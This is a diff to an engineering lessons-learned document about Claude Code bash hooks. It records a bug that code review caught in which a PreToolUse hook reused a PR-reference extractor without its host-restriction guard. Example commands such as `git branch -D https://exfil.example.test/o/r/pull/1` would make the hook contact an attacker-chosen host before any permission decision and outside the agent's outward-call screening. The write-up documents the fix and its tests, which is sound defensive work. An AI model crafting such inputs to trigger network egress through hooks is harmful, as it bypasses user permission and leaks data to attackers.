@@ -5,9 +5,9 @@ category: logic-errors
 module: shared
 tags: [bash, claude-hooks, parser-widening, consumer-contract, gh-cli, architecture]
 applies_to: [.claude/hooks/**/*.sh, server/services/**/*.ts]
-symptoms: [A hook or handler reports a confident well-formed result about the WRONG entity, The same input previously produced an empty result and an honest "could not verify", The regression appears only for inputs the widening newly accepts — every pre-existing input still behaves correctly, A parser change is described as "now handles more cases" with no consumer named]
+symptoms: [A hook or handler reports a confident well-formed result about the WRONG entity, The same input previously produced an empty result and an honest "could not verify", The regression appears only for inputs the widening newly accepts — every pre-existing input still behaves correctly, A parser change is described as "now handles more cases" with no consumer named, A file adopts a shared extractor its own comments cite as already having a documented hazard, without porting the guard the hazard's own existing consumer carries]
 created: '2026-08-06'
-last_updated: '2026-09-01'
+last_updated: '2026-09-14'
 severity: high
 ---
 
@@ -186,11 +186,67 @@ reading it. The durable habit: **a sentence asserting "this cannot lose a deny" 
 obligation, not a rationale.** Write the pair — one input that must keep the deny, one that
 must lose it — and let the pair, not the prose, carry the argument.
 
+## Third instance, 2026-09-14: a NEW consumer adopted the extractor pair without adopting its existing consumer's guard
+
+Not a widening this time — the same lesson from the opposite direction. `git-safety.sh`'s
+`gh pr close` advisory (todo P3-2026-09-13-git-safety-re-derives-the-gh-pr-close-needle)
+had its own hand-written raw-`$CMD` regex needle, unrelated to `cmd_gh_pr_ref` entirely. The
+fix ported it onto the shared `cmd_gh_pr_write_subcommand`/`cmd_gh_pr_ref` pair — the exact
+same two functions this file's "Related Files" section already names — to inherit their
+quote-aware rendering and root-position-flag handling. The port copied the *matcher*
+faithfully. It did not copy the *guard* the matcher's own header comment
+(`cmd_gh_pr_write_subcommand`, `.claude/hooks/lib/cmd-detect.sh:1836-1844`) explicitly
+requires of any new caller:
+
+> "...the redundant local lookup became network egress to an attacker-chosen host.
+> `pr-verify.sh` now host-restricts the ref before forwarding it, which is the ONLY reason
+> the claim above is still true. **Keep that guard if you reuse this matcher with a ref
+> extractor that can return a URL.**"
+
+`git-safety.sh` reused exactly that matcher/extractor pair and initially did not keep the
+guard. Caught by review (code-reviewer, CRITICAL) before merge — not shipped. Verified by
+direct construction, no `gh` invoked: `cmd_gh_pr_ref` on
+`echo "$(gh pr close https://exfil.example.test/o/r/pull/1)"` returns that exact URL with
+`rc=0`. Since `git-safety.sh`'s advisor branch is a **PreToolUse** hook (unlike
+`pr-verify.sh`, which is `PostToolUse`), the resulting `gh pr view "$REF"` would have opened
+a real network connection to an attacker-chosen host the instant the command was merely
+*proposed* — before any user permission decision, and independent of `guard-outward-cli.sh`
+(which screens the agent's own tool-call target, not a subprocess a hook spawns internally).
+
+**The pre-existing surface was larger than the new port alone.** `git-safety.sh`'s advisor
+branch shares ONE `REF`-processing block (and one `gh pr view "$REF"` call site) across
+**five** `KIND="delete"` paths: `git branch -D`, the long-form `--delete --force` spelling,
+`git push --delete`, `git push :ref`, and now `gh pr close`. The other four never went
+through `cmd_gh_pr_ref` — they extract `REF` via their own raw `sed` captures
+(`[^[:space:];&|]+`, unrestricted) — but that capture is JUST as capable of yielding a URL
+as a hand-typed branch/push argument, and NONE of `git-safety.sh`'s pre-existing REF checks
+(quote-strip, empty-after-normalization, flag-like, `$`/backtick) reject a plain `https://`
+string. Verified against `main` UNMODIFIED (commit `ac553192`, before this fix): `git branch
+-D https://exfil.example.test/o/r/pull/1` reaches `gh pr view https://exfil.example.test/o/r/pull/1
+--json number,state,mergedAt` — a real, unrestricted network call, live on `main` before this
+todo ever touched the file. The fix (mirroring `pr-verify.sh`'s `GH_ALLOWED_HOST` case
+statement) was therefore applied **unconditionally to `REF`**, immediately before the shared
+`gh pr view` call, closing the hole for all five branches at once — not scoped to only the
+newly-ported `gh pr close` path.
+
+**Generalization, sharper than "enumerate the consumers":** here the port's OWN consumer
+(`git-safety.sh` itself) was never in question — the miss was failing to also read the
+*sibling* consumer (`pr-verify.sh`) that the reused function's own docstring names as
+carrying a required guard. **Before reusing a shared extractor, grep its own header comment
+for "if you reuse this" / "keep this guard" language, and diff your new call site against
+the existing consumer's handling of the same return value — not just against the function's
+signature.** A function whose docstring already documents a hazard is not "fine because it's
+shared and already used elsewhere" — the guard lives at the CALL SITE, not inside the shared
+function, precisely because (per the Solution section above) a second output channel was
+rejected as too large a change. Every caller re-derives the guard or inherits the hole.
+
 ## Related Files
 
-- `.claude/hooks/lib/cmd-detect.sh` — `cmd_gh_pr_ref` (value-flag skip, `--repo`/`-R` disqualify), `cmd_gh_pr_write_subcommand`
-- `.claude/hooks/pr-verify.sh` — the consumer: host restriction, `gh pr view "$PR_REF"`, the honest-failure fallback branch
+- `.claude/hooks/lib/cmd-detect.sh` — `cmd_gh_pr_ref` (value-flag skip, `--repo`/`-R` disqualify), `cmd_gh_pr_write_subcommand` (header comment names the URL-egress guard requirement for any new caller)
+- `.claude/hooks/pr-verify.sh` — the original consumer: host restriction, `gh pr view "$PR_REF"`, the honest-failure fallback branch
 - `.claude/hooks/test-pr-verify.sh` — the covering test suite for both
+- `.claude/hooks/git-safety.sh` — the third instance: a new consumer of the same extractor pair, now carrying the same `GH_ALLOWED_HOST`-style restriction on `REF` before its own `gh pr view "$REF"` call (shared across all five `KIND="delete"` branches, not only `gh pr close`)
+- `.claude/hooks/test-git-safety.sh` — covering tests: an attacker URL ref refused, the same URL hidden inside a live `"$(...)"` substitution refused, an allowed same-host GitHub PR URL still resolves
 
 ## See Also
 
